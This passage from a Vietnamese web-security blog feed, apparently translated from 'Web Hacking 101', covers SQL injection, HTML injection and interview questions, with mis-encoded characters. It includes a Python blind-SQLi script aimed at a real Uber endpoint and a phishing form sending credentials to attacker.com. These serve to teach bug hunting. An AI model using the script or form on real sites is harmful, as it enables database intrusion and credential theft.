t√°c truy v·∫•n v√† so s√°nh k·∫øt qu·∫£ v·ªõi k·∫øt qu·∫£ ƒë·∫ßu ti√™n, anh ta ƒë√£ c√≥ th·ªÉ ti·∫øp t·ª•c tr√≠ch xu·∫•t th√¥ng tin t·ª´ CSDL c·ªßa Yahoo.  3. Uber Blind SQLi  Ngo√†i c√°c trang web, vi·ªác SQL Injection c√≥ th·ªÉ ƒë·∫°t ƒë∆∞·ª£c th√¥ng qua c√°c ch·ªó kh√°c nh∆∞ li√™n k·∫øt email. V√†o th√°ng 7 nƒÉm 2016, Orange Tsai ƒë√£ nh·∫≠n ƒë∆∞·ª£c m·ªôt qu·∫£ng c√°o email t·ª´ Uber. Anh ·∫•y nh·∫≠n th·∫•y r·∫±ng li√™n k·∫øt h·ªßy ƒëƒÉng k√Ω bao g·ªìm m·ªôt chu·ªói ƒë∆∞·ª£c m√£ h√≥a base64 l√†m tham s·ªë URL. Li√™n k·∫øt tr√¥ng gi·ªëng nh∆∞: 1 2  http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUiLCAi\\ cmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ9    Decode ƒëo·∫°n eyJ1c2VyX2lkIjogIjU3NTUiLCAi, s·ª≠ d·ª•ng base64 tr·∫£ v·ªÅ chu·ªói JSON{\u0026quot;user_id\u0026quot;: \u0026quot;5755\u0026quot;, \u0026quot;receiver\u0026quot;: \u0026quot;orange@mymail\u0026quot;}. Sau khi c√≥ chu·ªói gi·∫£i m√£, anh ta th√™m and sleep(12)=1 v√†o tham s·ªë URL ƒë∆∞·ª£c m√£ h√≥a, ƒë√¢y l√† m·ªôt ph√©p injection v√¥ h·∫°i ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ l√†m cho CSDL m·∫•t nhi·ªÅu th·ªùi gian h∆°n ƒë·ªÉ ƒë√°p ·ª©ng v·ªõi h√†nh ƒë·ªông h·ªßy ƒëƒÉng k√Ω {\u0026quot;user_id\u0026quot;: \u0026quot;5755 and sleep(12)=1\u0026quot;, \u0026quot;receiver\u0026quot;: \u0026quot;orange@mymail\u0026quot;}. N·∫øu m·ªôt trang web d·ªÖ b·ªã vulnerrable, vi·ªác th·ª±c hi·ªán truy v·∫•n s·∫Ω ƒë√°nh gi√° sleep(12) v√† kh√¥ng th·ª±c hi·ªán h√†nh ƒë·ªông n√†o trong 12 gi√¢y tr∆∞·ªõc khi so s√°nh d·∫ßu ra c·ªßa l·ªánh sleep v·ªõi 1. Trong MySQL, l·ªánh sleep th∆∞·ªùng tr·∫£ v·ªÅ 0, do ƒë√≥ vi·ªác so s√°nh n√†y s·∫Ω th·∫•t b·∫°i, nh∆∞ng ƒëi·ªÅu n√†y kh√¥ng quan tr·ªçng v√¨ vi·ªác th·ª±c thi s·∫Ω m·∫•t √≠t nh·∫•t 12 gi√¢y. Sau khi Orange m√£ h√≥a l·∫°i payload ƒë√£ s·ª≠a ƒë·ªïi v√† chuy·ªÉn payload ƒë√≥ sang tham s·ªë URL, anh ta ƒë√£ truy c·∫≠p li√™n k·∫øt h·ªßy ƒëƒÉng k√Ω ƒë·ªÉ x√°c nh·∫≠n ph·∫£n h·ªìi HTTP m·∫•t √≠t nh·∫•t 12 gi√¢y. Tuy nhi√™n Orangeddax quy·∫øt ƒë·ªãnh r·∫±ng anh ta c·∫ßn th√™m b·∫±ng ch·ª©ng c·ª• th·ªÉ v·ªÅ SQLi ƒë·ªÉ g·ª≠i cho Uber, v√¨ v·∫≠y anh ta ƒë√£ quy·∫øt ƒë·ªãnh k·∫øt xu·∫•t username, hostname, v√† name of the database b·∫±ng c√°ch s·ª≠ d·ª•ng brute force v√¨ n√≥ th·ªÉ hi·ªán kh·∫£ nƒÉng tr√≠ch xu·∫•t th√¥ng tin t·ª´ SQLi m√† kh√¥ng c·∫ßn truy c·∫≠p d·ªØ li·ªáu b√≠ m·∫≠t. SQL c√≥ m·ªôt h√†m called user tr·∫£ v·ªÅ username v√† t√™n m√°y ch·ªß c·ªßa CSDL ·ªü d·∫°ng \u0026lt;user\u0026gt;@\u0026lt;host\u0026gt;. B·ªüi v√¨ Orange kh√¥ng th·ªÉ truy c·∫≠p ƒë·∫ßu ra t·ª´ c√°c truy v·∫•n ƒë∆∞·ª£c injecion c·ªßa m√¨nh, anh ta kh√¥ng th·ªÉ g·ªçi cho ng∆∞·ªùi d√πng. Thay v√†o ƒë√≥, Oarange ƒë√£ s·ª≠a ƒë·ªïi truy v·∫•n c·ªßa m√¨nh ƒë·ªÉ th√™m ki·ªÉm tra c√≥ ƒëi·ªÅu ki·ªán khi truy v·∫•n tra c·ª©u ID ng∆∞·ªùi d√πng c·ªßa anh ta. So s√°nh m·ªôt k√Ω t·ª± c·ªßa t√™n ng∆∞·ªùi d√πng CSDL v√† chu·ªói t√™n m√°y ch·ªß t·∫°i m·ªôt th·ªùi ƒëi·ªÉm b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m mid. T∆∞∆°ng t·ª± nh∆∞ SQLi c·ªßa Yahoo Sports t·ª´ b√°o c√°o l·ªói tr∆∞·ªõc ƒë√≥. Orange ƒë√£ s·ª≠ d·ª•ng m·ªôt c√¢u l·ªánh so s√°nh ƒë·ªÉ l·∫•y t·ª´ng k√Ω t·ª± c·ªßa t√™n ng∆∞·ªùi d√πng v√† chu·ªói t√™n m√°y ch·ªß. V√≠ d·ª•: ƒë·ªÉ t√¨m t√™n ng∆∞·ªùi d√πng v√† t√™n m√°y ch·ªß b·∫±ng c√°ch s·ª≠ d·ª•ng c√¢u l·ªánh so s√°nh v√† s·ª©c m·∫°nh c·ªßa brute force, Orange ƒë√£ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa gi√° tr·ªã ƒë∆∞·ª£c tr·∫£ v·ªÅ t·ª´ ng∆∞·ªùi d√πng b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m mid v√† ƒëem so s√°nh xem k√Ω t·ª± ƒë√≥ c√≥ b·∫±ng 'a' kh√¥ng, sau ƒë√≥ ƒë·∫øn 'b' r·ªìi 'c',.. N·∫øu c√¢u l·ªánh so s√°nh l√† ƒë√∫ng, m√°y ch·ªß s·∫Ω th·ª±c thi l·ªánh h·ªßy ƒëƒÉng k√Ω cho bi·∫øt r·∫±ng k√Ω t·ª± ƒë√†u ti√™n c·ªßa gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa h√†m user b·∫±ng v·ªõi k√Ω t·ª± m√† n√≥ ƒë∆∞·ª£c so s√°nh. M·∫∑t kh√°c, n·∫øu sai th√¨ m√°y ch·ªß s·∫Ω kh√¥ng h·ªßy ƒëƒÉng k√Ω c·ªßa anh ta. B·∫±ng c√°ch ki·ªÉm tra t·ª´ng k√Ω t·ª± c·ªßa h√†m user. Gi√° tr·ªã tr·∫£ v·ªÅ b·∫±ng ph∆∞∆°ng th·ª©c n√†y, Orange cu·ªëi c√πng s·∫Ω c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c to√†n b·ªô t√™n ng∆∞·ªùi d√πng v√† t√™n m√°y ch·ªß. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  mport json import string import requests from urllib import quote from base64 import b64encode base = string.digits + string.letters + \u0026#39;_-@.\u0026#39; payload = {\u0026#34;user_id\u0026#34;: 5755, \u0026#34;receiver\u0026#34;: \u0026#34;blog.orange.tw\u0026#34;} for l in range(0, 30): for i in base: payload[\u0026#39;user_id\u0026#39;] = \u0026#34;5755 and mid(user(),%d,1)=\u0026#39;%c\u0026#39;#\u0026#34;%(l+1, i) new_payload = json.dumps(payload) new_payload = b64encode(new_payload) r = requests.get(\u0026#39;http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=\u0026#39;+\\ quote(new_payload)) if len(r.content)\u0026gt;0: print i, break    ƒê√¢y l√† m·ªôt ƒëo·∫°n code vi·∫øt b·∫±ng python gi√∫p Orange l·∫•y ƒë∆∞·ª£c t√™n ng∆∞·ªùi d√πng v√† t√™n m√°y ch·ªß.  Summary  SQLi c√≥ th·ªÉ l√† m·ªôt l·ªó h·ªïng nguy hi·ªÉm cho m·ªôt trang web. N·∫øu k·∫ª t·∫•n c√¥ng t√¨m th·∫•y SQLi, ch√∫ng c√≥ th·ªÉ c√≥ ƒë∆∞·ª£c full quy·ªÅn cho m·ªôt trang web. Trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p, SQLi c√≥ th·ªÉ ƒë∆∞·ª£c leo thang b·∫±ng c√°ch ch√®n d·ªØ li·ªáu v√†o CSDL cho ph√©p quy·ªÅn qu·∫£n tr·ªã tren trang web, nh∆∞ trong v√≠ d·ª• v·ªÅ Drupal. Khi t√¨m ki·∫øm c√°c l·ªó h·ªïng SQLi, h√£y ch√∫ √Ω ƒë·∫øn nh·ªØng n∆°i m√† b·∫°n c√≥ th·ªÉ chuy·ªÉn c√°c gi·∫•u ngo·∫∑c ƒë∆°n ho·∫∑c d·∫•u ng∆∞·ª£c k√©p kh√¥ng ƒë∆∞·ª£c gi·∫£i m√£ cho m·ªôt truy v·∫•n. Khi b·∫°n t√¨m th·∫•y m·ªôt l·ªó h·ªïng, c√°c d·∫•u hi·ªáu cho th·∫•y l·ªó h·ªïng ƒë√≥ t·ªìn t·∫°i c√≥ th·ªÉ l√† m·ªôt hint, ch·∫≥ng h·∫°n nh∆∞ blind injection. B·∫°n c≈©ng n√™n t√¨m nh·ªØng n∆°i m√† b·∫°n c√≥ th·ªÉ truy·ªÅn d·ªØ li·ªáu ƒë·∫øn m·ªôt trang web theo nh·ªØng c√°ch kh√¥ng mong mu·ªën, ch·∫≥ng h·∫°n nh∆∞ nh·ªØng n∆°i b·∫°n c√≥ th·ªÉ thay th·∫ø c√°c tham s·ªë m·∫£ng trong d·ªØ li·ªáu y√™u c·∫ßu nh∆∞ trong l·ªói c·ªßa Uber.  ","permalink":"https://minhtuanact.ml/posts/phan-9-sql-injection/","summary":"Description  SQL ( /Àà…õs kjuÀê Àà…õl/, ho·∫∑c /ÀàsiÀêkw…ôl/; Structured Query Language) hay ng√¥n ng·ªØ truy v·∫•n mang t√≠nh c·∫•u tr√∫c, l√† m·ªôt lo·∫°i ng√¥n ng·ªØ m√°y t√≠nh ph·ªï bi·∫øn ƒë·ªÉ t·∫°o, s·ª≠a, v√† l·∫•y d·ªØ li·ªáu t·ª´ m·ªôt h·ªá qu·∫£n tr·ªã c∆° s·ªü d·ªØ li·ªáu quan h·ªá. SQL Injection ho·∫∑c SQLi x·∫£y ra khi c√≥ m·ªôt l·ªó h·ªïng database-backed tr√™n trang web cho ph√©p Attacker truy v·∫•n ho·∫∑c t·∫•n c√¥ng database c·ªßa trang web.","title":"Ph·∫ßn 9: SQL Injection"},{"content":"Description  Hypertext Markup Language (HTML) injection ƒë√¥i khi c≈©ng h∆°i ·∫£o ·∫£o =)). ƒê√¢y th·ª±c s·ª± l√† m·ªôt cu·ªôc t·∫•n c√¥ng ƒë∆∞·ª£c th·ª±c hi·ªán b·ªüi m·ªôt website cho ph√©p ng∆∞·ªùi d√πng inject HTML v√†o c√°c trang web c·ªßa m√¨nh b·∫±ng c√°i ki·ªÉu m√† kh√¥ng gi·ªëng ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng nh·∫≠p d·ªØ li·ªáu. N√≥i c√°ch kh√°c, HTML Injection ƒë∆∞·ª£c g√¢y ra b·ªüi vi·ªác nh·∫≠n HTML. Th√¥ng th∆∞·ªùng, th√¥ng qua m·ªôt s·ªë h√¨nh th·ª©c nh·∫≠p, sau ƒë√≥ ƒë∆∞·ª£c hi·ªán th·ªã d∆∞·ªõi d·∫°ng input form tr√™n trang web. ƒêi·ªÅu n√†y kh√°c bi·ªát v·ªõi Javascript, VBScript, \u0026hellip;, c√≥ th·ªÉ d·∫´n ƒë·∫øn Cross Site Scripting Attacks. V√¨ HTML l√† ng√¥n ng·ªØ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh c·∫•u tr√∫c c·ªßa m·ªôt website, n·∫øu Attacker c√≥ th·ªÉ HTML Injection, v·ªÅ c∆° b·∫£n ch√∫ng c√≥ th·ªÉ thay ƒë·ªïi giao di·ªán c·ªßa tr√¨nh duy·ªát v√† c·ªßa trang web ƒë√≥. ƒê√¥i khi, ƒëi·ªÅu n√†y c√≥ th·ªÉ d·∫´n ƒë·∫øn thay ƒë·ªïi ho√†n to√†n giao di·ªán c·ªßa trang ho·∫∑c trong c√°c tr∆∞·ªùng h·ª£p kh√°c, t·∫°o HTML forms ƒë·ªÉ l·ª´a ng∆∞·ªùi d√πng v·ªõi hy v·ªçng h·ªç s·ª≠ d·ª•ng form ƒë·ªÉ g·ª≠i th√¥ng tin nh·∫°y c·∫£m (C√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi l√† l·ª´a ƒë·∫£o). V√≠ d·ª•: N·∫øu b·∫°n c√≥ th·ªÉ HTML Injection, b·∫°n c√≥ th·ªÉ th√™m th·∫ª v√†o trang, y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p l·∫°i t√™n ng∆∞·ªùi d√πng v√† m·∫≠t kh·∫©u c·ªßa h·ªç nh∆∞: 1 2 3 4 5  \u0026lt;form method=\u0026#39;POST\u0026#39; action=\u0026#39;http://attacker.com/capture.php\u0026#39; id=\u0026#34;login-form\u0026#34;\u0026gt; \u0026lt;input type=\u0026#39;text\u0026#39; name=\u0026#39;username\u0026#39; value=\u0026#39;\u0026#39;\u0026gt; \u0026lt;input type=\u0026#39;password\u0026#39; name=\u0026#39;password\u0026#39; value=\u0026#39;\u0026#39;\u0026gt; \u0026lt;input type=\u0026#39;submit\u0026#39; value=\u0026#39;submit\u0026#39;\u0026gt; \u0026lt;/form\u0026gt;    Tuy nhi√™n, khi g·ª≠i form n√†y, th√¥ng tin th·ª±c s·ª± s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒë·∫øn http://attacker.com/ th√¥ng qua thu·ªôc t√≠nh action, n√≥ s·∫Ω g·ª≠i th√¥ng tin ƒë·∫øn trang web c·ªßa Attacker.  Examples 1. Coinbase Comments Description  ƒê·ªëi v·ªõi l·ªó h·ªïng n√†y, reporter ƒë√£ x√°c ƒë·ªãnh r·∫±ng Coinbase ƒëang gi·∫£i m√£ c√°c gi√° tr·ªã ƒë∆∞·ª£c m√£ h√≥a URI khi render vƒÉn b·∫£n. Th√¥ng th∆∞·ªùng c√°c k√≠ t·ª± trong URI kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá. Khi m·ªôt k√Ω t·ª± ƒë∆∞·ª£c m√£ h√≥a URI, n√≥ ƒë∆∞·ª£c chuy·ªÉn ƒë·ªïi th√†nh gi√° tr·ªã byte trong b·∫£ng m√£ ASCII v√† tr∆∞·ªõc d·∫•u %. V√¨ v·∫≠y, / tr·ªü th√†nh %2F, \u0026amp; tr·ªü th√†nh %26. B√™n c·∫°nh ƒë√≥, ASCII l√† m·ªôt lo·∫°i m√£ ph·ªï bi·∫øn nh·∫•t tr√™n internet cho ƒë·∫øn khi UTF-8 xu·∫•t hi·ªán. Ch√∫ng ta c√πng ƒë·∫øn m·ªôt v√≠ d·ª• v·ªÅ lo·∫°i t·∫•n c√¥ng n√†y nh√©. 1  \u0026lt;h1\u0026gt;This is a test\u0026lt;/h1\u0026gt;     * Coinbase s·∫Ω hi·ªÉn th·ªã d∆∞·ªõi d·∫°ng vƒÉn b·∫£n thu·∫ßn t√∫y, ch√≠nh x√°c nh∆∞ b·∫°n th·∫•y ·ªü b√™n tr√™n. Nh∆∞ng ng∆∞·ªùi d√πng g·ª≠i ƒëi nh·ªØng k√Ω t·ª± ƒë∆∞·ª£c m√£ h√≥a th√¨ s·∫Ω tr·ªü th√†nh ```html %3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E ``` * Coinbase s·∫Ω gi·∫£i m√£ chu·ªói ƒë√≥ v√† hi·ªÉn th·ªã d∆∞·ªõi d·∫°ng \u0026lt;h1\u0026gt;This is a test\u0026lt;/h1\u0026gt; * B·∫°n ƒë·ªçc c√≥ th·ªÉ xem video n√†y ƒë·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ ki·ªÉu t·∫•n c√¥ng n√†y. \u0026gt; [HTML Injection in apps user review](https://www.dropbox.com/s/360cytluyiw2ym9/HTMLI.mp4?dl=0) * Khi b·∫°n ki·ªÉm tra m·ªôt trang web, h√£y ki·ªÉm tra xem n√≥ ƒë∆∞·ª£c x·ª≠ l√Ω c√°c lo·∫°i ƒë·∫ßu v√†o kh√°c nhau n√†o, bao g·ªìm vƒÉn b·∫£n thu·∫ßn t√∫y v√† vƒÉn b·∫£n ƒë∆∞·ª£c m√£ h√≥a. H√£y h·∫øt s·ª©c c·∫£nh gi√°c v·ªõi c√°c trang web ch·∫•p nh·∫≠n c√°c gi√° tr·ªã ƒë∆∞·ª£c m√£ h√≥a URI v√† hi·ªÉn th·ªã ƒë∆∞·ª£c decoded values. B·∫°n ƒë·ªçc c√≥ th·ªÉ s·ª≠ d·ª•ng c√¥ng c·ª• [CyberChef](https://gchq.github.io/CyberChef) ƒë·ªÉ m√£ h√≥a v√† gi·∫£i m√£ URI. T√¥i nghƒ© r·∫±ng b·∫°n s·∫Ω r·∫•t th√≠ch n√≥ ƒë·∫•y ^^.  2. HackerOne Unintended HTML Inclusion Description:  V·ªÅ v·∫•n ƒë·ªÅ n√†y, ch√∫ng ta s·∫Ω cho m·ªôt v√≠ d·ª• lu√¥n nh√©. 1  [test](http://www.torontowebsitedeveloper.com \u0026#34;test ismap=\u0026#34;yes\u0026#34;\u0026#39;)   Tr√¨nh so·∫°n th·∫£o HTML s·∫Ω l·∫•y ƒëo·∫°n ·ªü tr√™n v√† bi·∫øn th√†nh 1  \u0026lt;a title=\u0026#34;test ismap=\u0026#34;yes\u0026#34;\u0026#39; href=\u0026#34;http://www.torontowebsitedeveloper.com\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt;   N√≥i c√°ch kh√°c, code s·∫Ω xem x√©t ƒë·ªá quy chu·ªói n√†o n√™n l√† chu·ªói ti√™u ƒë·ªÅ v√† s·ª≠ d·ª•ng first single ho·∫∑c double quote. T√¥i ƒë√£ c√≥ th·ªÉ ƒë∆∞a 1 lo·∫°t HTML v√†o th·∫ª \u0026lt;a\u0026gt;. ƒê√¢y c√≥ v·∫ª l√† m·ªôt l·ªói kh√° nghi√™m tr·ªçng ƒë√∫ng kh√¥ng :D.  3. Within Security Content Spoofing Description:  M·∫∑c d√π v·ªÅ m·∫∑t spoofing n·ªôi dung v·ªÅ m·∫∑t k·ªπ thu·∫≠t l√† m·ªôt lo·∫°i l·ªó h·ªïng kh√°c v·ªõi HTML Injection, t√¥i ƒë√£ ƒë∆∞a n√≥ v√†o ƒë√¢y v√¨ attacker c√≥ th·ªÉ hi·ªÉn th·ªã n·ªôi dung m√† attacker mu·ªën ch·ªçn. Inside Security ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n n·ªÅn t·∫£ng Wordpress bao g·ªìm ƒë∆∞·ªùng d·∫´n ƒëƒÉng nh·∫≠p withinsecurity.com/wp-login.php. M·ªôt hacker nh·∫≠n th·∫•y r·∫±ng trong qu√° tr√¨nh ƒëƒÉng nh·∫≠p, n·∫øu x·∫£y ra l·ªói th√¨ Inside Security s·∫Ω hi·ªÉn th·ªã access_denied, c≈©ng t∆∞∆°ng ·ª©ng v·ªõi tham s·ªë l·ªói trong URL: 1  https://withinsecurity.com/wp-login.php?error=access_denied   Nh·∫≠n th·∫•y ƒëi·ªÅu n√†y, attacker ƒë√£ th·ª≠ s·ª≠a ƒë·ªïi tham s·ªë l·ªói v√† th·∫•y r·∫±ng b·∫•t k·ª≥ gi√° tr·ªã n√†o ƒë∆∞·ª£c nh·∫≠p v√†o ƒë·ªÅu ƒë∆∞·ª£c trang web hi·ªÉn th·ªã nh∆∞ m·ªôt ph·∫ßn c·ªßa th√¥ng b√°o l·ªói ƒë∆∞·ª£c th√¥ng b√°o cho ng∆∞·ªùi d√πng. D∆∞·ªõi ƒë√¢y, v√≠ d·ª• ƒë∆∞·ª£c s·ª≠ d·ª•ng: 1  https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked   * K·∫øt lu·∫≠n ·ªü ƒë√¢y: Ta th·∫•y tham s·ªë trong URL ƒë∆∞·ª£c hi·ªÉn th·ªã tr√™n trang. M·ªôt th·ª≠ nghi·ªám ƒë∆°n gi·∫£n thay ƒë·ªïi tham s·ªë access_denied c√≥ th·ªÉ ƒë√£ t·∫°o ra m·ªôt l·ªó h·ªïng trong tr∆∞·ªùng h·ª£p n√†y. * Ch√∫ √Ω: Theo d√µi c√°c tham s·ªë URL ƒëang ƒë∆∞·ª£c th√¥ng qua v√† hi·ªÉn th·ªã d∆∞·ªõi d·∫°ng n·ªôi dung c·ªßa trang. Ch√∫ng c√≥ th·ªÉ t·∫°o c∆° h·ªôi cho attacker l·ª´a n·∫°n nh√¢n th·ª±c hi·ªán m·ªôt s·ªë h√†nh ƒë·ªông nguy hi·ªÉm. ƒê√¥i khi, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn c√°c ki·ªÉu t·∫•n c√¥ng Cross Site Scripting ho·∫∑c l√† gi·∫£ m·∫°o n·ªôi dung v√† HTML Injection.  Summary  HTML Injection tr√¨nh b√†y m·ªôt l·ªó h·ªïng cho c√°c trang web v√† nh√† ph√°t tri·ªÉn v√¨ n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ l·ª´a ƒë·∫£o ng∆∞·ªùi d√πng v√† l·ª´a h·ªç g·ª≠i th√¥ng tin nh·∫°y c·∫£m ƒë·∫øn ho·∫∑c truy c·∫≠p c√°c trang web ƒë·ªôc h·∫°i. Kh√°m ph√° c√°c lo·∫°i l·ªó h·ªèng n√†y kh√¥ng ph·∫£i lu√¥n lu√¥n l√† g·ª≠i HTML ƒë∆°n gi·∫£n m√† c√≤n ph·∫£i kh√°m ph√° c√°ch m√† m·ªôt trang web c√≥ th·ªÉ hi·ªÉn th·ªã vƒÉn b·∫£n ƒë∆∞·ª£c nh·∫≠p c·ªßa b·∫°n, nh∆∞ c√°c k√Ω t·ª± ƒë∆∞·ª£c m√£ h√≥a URI. V√† m·∫∑c d√π kh√¥ng ho√†n to√†n gi·ªëng nh∆∞ n·ªôi dung HTML, vi·ªác gi·∫£ m·∫°o n·ªôi dung c≈©ng t∆∞·ª£ng t·ª± ·ªü ch·ªó n√≥ li√™n quan ƒë·∫øn ƒë·∫ßu v√†o ƒë∆∞·ª£c hi·ªÉn th·ªã l√™n cho n·∫°n nh√¢n trong trang HTML. Attacker lu√¥n c√≥ c∆° h·ªôi ƒë·ªÉ lo·∫°i b·ªè tham s·ªë URL v√† hi·ªÉn th·ªã ch√∫ng tr√™n trang web.    Ngu·ªìn: Web Hacking 101, bi√™n t·∫≠p v√† d·ªãch l·∫°i.\n ","permalink":"https://minhtuanact.ml/posts/phan-5-html-injection/","summary":"Description  Hypertext Markup Language (HTML) injection ƒë√¥i khi c≈©ng h∆°i ·∫£o ·∫£o =)). ƒê√¢y th·ª±c s·ª± l√† m·ªôt cu·ªôc t·∫•n c√¥ng ƒë∆∞·ª£c th·ª±c hi·ªán b·ªüi m·ªôt website cho ph√©p ng∆∞·ªùi d√πng inject HTML v√†o c√°c trang web c·ªßa m√¨nh b·∫±ng c√°i ki·ªÉu m√† kh√¥ng gi·ªëng ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng nh·∫≠p d·ªØ li·ªáu. N√≥i c√°ch kh√°c, HTML Injection ƒë∆∞·ª£c g√¢y ra b·ªüi vi·ªác nh·∫≠n HTML. Th√¥ng th∆∞·ªùng, th√¥ng qua m·ªôt s·ªë h√¨nh th·ª©c nh·∫≠p, sau ƒë√≥ ƒë∆∞·ª£c hi·ªán th·ªã d∆∞·ªõi d·∫°ng input form tr√™n trang web.","title":"Ph·∫ßn 5: HTML Injection"},{"content":"H·ªèi: Answer true or false and explain your answer: two-factor authentication protects against session hijacking? Tr·∫£ l·ªùi:  V·ªÅ c√¢u tr·∫£ l·ªùi n√†y, m√¨nh v·∫´n ch∆∞a bi·∫øt n√™n tr·∫£ l·ªùi l√† ƒë√∫ng hay sai. C√≥ 2 tr∆∞·ªùng h·ª£p x·∫£y ra ·ªü ƒë√¢y:  Tr∆∞·ªõc khi b·∫°n nh·∫≠p m√£ x√°c minh g·ª≠i ƒë·∫øn ƒëi·ªán tho·∫°i hay ·ª©ng d·ª•ng hay ƒë·∫°i lo·∫°i l√† 1 m√£ OTP n√†o ƒë√≥ m√† b√™n Server g·ª≠i cho b·∫°n ƒë·ªÉ x√°c minh ƒë√≥ ƒë√∫ng l√† b·∫°n ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n c·ªßa b·∫°n. Th√¨ khi ƒë√≥ attacker kh√¥ng th·ªÉ chi·∫øn quy·ªÅn ƒëi·ªÅu khi·ªÉn phi√™n ƒë∆∞·ª£c. Nh∆∞ng sau khi b·∫°n nh·∫≠p m√£ x√°c minh r·ªìi. Attacker c√≥ th·ªÉ th·ª±c hi·ªán vi·ªác chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn phi√™n do b√™n d·ªãch v·ª• kia ƒë·∫∑t v√†o b·∫±ng XSS ho·∫∑c malware. Attacker c√≥ th·ªÉ s·ª≠ d·ª•ng c√°i Token Cookie ƒë√≥ v√† ƒë∆∞a v√†o y√™u c·∫ßu c·ªßa h·ªç cho b√™n kia (v√≠ d·ª• nh∆∞ Google). V√† sau ƒë√≥ attacker ƒë√£ c√≥ quy·ªÅn truy c·∫≠p v√†o t√†i kho·∫£n c·ªßa b·∫°n. C√≤n v·ªÅ c√¢u tr·∫£ l·ªùi ƒë√∫ng hay sai th√¨ b·∫°n ƒë·ªçc c√≥ th·ªÉ t·ª± tr·∫£ l·ªùi r·ªìi nh√© :D.    H·ªèi: Explain what happens when a connection from your webbrowser to a webserver is initiated on every OSI layer (as detailed as you like) Tr·∫£ l·ªùi:   Ch√∫ng ta s·∫Ω c√πng ph√¢n t√≠ch g√≥i tin s·∫Ω ƒë∆∞·ªùng truy·ªÅn ƒëi tr√™n m·∫°ng Internet nh∆∞ th·∫ø n√†o, c·ª• th·ªÉ ·ªü ƒë√¢y l√† ch√∫ng ta ƒëang l∆∞·ªõt web, v√† m√¥ h√¨nh s·ª≠ d·ª•ng l√† OSI (H∆∞·ªõng ƒëi c·ªßa g√≥i tin s·∫Ω l√† t·ª´ ph√≠a m√°y g·ª≠i (client) ƒë·∫øn m√°y nh·∫≠n (Server))\n  M√¥ h√¨nh OSI s·∫Ω nh∆∞ sau:\n Application Layer: ƒê√¢y l√† l·ªõp g·∫ßn nh·∫•t v·ªõi ng∆∞·ªùi d√πng, t·ª´ ƒë√¢y, t·∫•t c·∫£ d·ªØ li·ªáu, y√™u c·∫ßu c·ªßa ng∆∞·ªùi d√πng s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o th√†nh 1 kh·ªëi Data t√πy theo l∆∞·ª£ng th√¥ng tin m√† ng∆∞·ªùi d√πng c·∫ßn g·ª≠i ƒëi. V√≠ d·ª• khi nh·∫≠p ƒë·ªãa ch·ªâ m·ªôt website v√†o tr√¨nh duy·ªát, th√¨ m·ªôt y√™u c·∫ßu HTTP GET s·∫Ω ƒë∆∞·ª£c t·∫°o ra, d·ª±a tr√™n th√¥ng tin m√† ng∆∞·ªùi d√πng ƒë√£ nh·∫≠p v√†o. Transport Layer: T·∫°i l·ªõp n√†y, d·ªØ li·ªáu s·∫Ω ƒë∆∞·ª£c chia nh·ªè th√†nh c√°c kh·ªëi Data c√≥ k√≠ch th∆∞·ªõc ph√π h·ª£p, sau ƒë√≥ s·∫Ω ƒë∆∞·ª£c ƒë√≥ng g√≥i l·∫°i, m·ªôt Header ƒë∆∞·ª£c th√™m v√†o nh·∫±m theo d√µi lu·ªìng d·ªØ li·ªáu v√† t·∫≠p h·ª£p d·ªØ li·ªáu t·∫°i m√°y ƒë√≠ch. Nh·ªØng g√≥i tin nh·ªè n√†y ƒë∆∞·ª£c g·ªçi l√† c√°c Segment.  ·ªû Transport Layer s·∫Ω ƒë∆∞·ª£c g·∫Øn cho m·ªói Application m·ªôt ƒë·ªãnh danh ƒë∆∞·ª£c g·ªçi l√† port number. T·∫°i sau l·∫°i c√≥ port number? V√¨ c√≥ r·∫•t nhi·ªÅu ·ª©ng d·ª•ng, d·ªãch v·ª• ch·∫°y tr√™n m·ªói host, n√™n ƒë·ªÉ chuy·ªÉn ch√≠nh x√°c d·ªØ li·ªáu cho c√°c ·ª©ng d·ª•ng d·ªãch v·ª• ƒë√≥, port number ƒë∆∞·ª£c sinh ra. ·ªû ƒë√¢y ta ƒëang l∆∞·ªõt web n√™n ta s·∫Ω c√≥ c√°c port number nh∆∞ HTTP: 80, HTTPS: 443. T√πy theo ·ª©ng d·ª•ng kh√°c nhau, y√™u c·∫ßu ƒë·ªô tin c·∫≠y kh√°c nhau th√¨ l·ªõp Transport s·∫Ω s·ª≠ d·ª•ng TCP hay UDP cho ph√π h·ª£p.  TCP: Tin c·∫≠y, ƒë·∫£m b·∫£o cho d·ªØ li·ªáu ƒë·ªÅu ƒë∆∞·ª£c truy·ªÅn ƒëi t·ªõi ƒë√≠ch ƒë√∫ng v√† ƒë·ªß, tuy nhi√™n ch·∫≠m h∆°n UDP. UDP: ƒê∆°n gi·∫£n, kh√¥ng tin c·∫≠y, truy·ªÅn d·ªØ li·ªáu c√≥ th·ªÉ b·ªã 